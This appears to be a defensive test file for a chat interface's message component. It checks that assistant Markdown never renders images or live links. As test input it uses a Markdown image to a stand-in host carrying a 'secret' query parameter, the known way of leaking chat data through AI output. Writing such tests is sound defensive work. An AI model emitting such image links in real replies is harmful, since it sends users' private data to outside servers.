import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import type { ChatMessage } from "../types";
import { MessageBubble } from "./MessageBubble";

function render(content: string): string {
  const message = {
    id: "m1",
    role: "assistant",
    content,
    createdAt: new Date().toISOString(),
    context: [],
  } as unknown as ChatMessage;

  return renderToStaticMarkup(
    <MessageBubble
      message={message}
      onRetry={() => {}}
      onEdit={() => true}
      onRegenerate={() => {}}
      actionsDisabled={false}
      canRegenerate={false}
    />,
  );
}

// "<a" alone would also match "<article", which every message is wrapped in,
// so look for an anchor tag exactly: "<a" followed by a space or ">".
const ANCHOR_TAG = /<a[\s>]/;

describe("assistant Markdown is safe", () => {
  it("never renders an image", () => {
    const html = render("![x](https://evil.test/a.png?q=secret)");
    expect(html).not.toContain("<img");
    expect(html).toContain("[image: x]");
  });

  it("never renders a live link, but shows the address", () => {
    const html = render("[click](https://evil.test)");
    expect(html).not.toMatch(ANCHOR_TAG);
    expect(html).not.toContain("href=");
    expect(html).toContain("click");
    expect(html).toContain("https://evil.test");
  });

  it("does not make a bare URL clickable", () => {
    const html = render("see https://evil.test/page");
    expect(html).not.toMatch(ANCHOR_TAG);
    expect(html).not.toContain("href=");
    expect(html).toContain("https://evil.test/page");
  });
});